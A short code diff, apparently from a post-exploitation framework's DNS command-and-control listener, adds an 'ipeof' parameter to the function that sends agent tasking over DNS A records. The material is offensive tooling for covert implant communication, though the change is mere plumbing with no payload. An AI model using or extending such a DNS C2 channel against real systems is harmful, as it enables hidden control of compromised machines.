@@ -737,7 +737,7 @@ def send_message(packets=None):
         return data
 
     # Agent requests tasking information
-    def process_tasking_a(self, sock, stagingKey, listenerOptions, recv_hostname, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer, reply_id, reply_qd):
+    def process_tasking_a(self, sock, stagingKey, listenerOptions, recv_hostname, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer, ipeof, reply_id, reply_qd):
         self.send_a_record_reply_id(sock, recv_hostname, ipack, addr, reply_id, reply_qd)
 
         a_base32 = ""
@@ -905,7 +905,7 @@ def send_message(packets=None):
                         # Tasking
                         elif host.startswith(taskinghostname):
                             print "[TASKING A]"
-                            tasking_results = self.process_tasking_a(sock, stagingKey, listenerOptions, host, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer, dns.id, dns.qd)
+                            tasking_results = self.process_tasking_a(sock, stagingKey, listenerOptions, host, ipack, ipnop, ipswitchatotxt, addr, fake_domain, astoptransfer, ipeof, dns.id, dns.qd)
                         else:
                             self.default_response()
                     elif dns[DNSQR].qtype == 16:
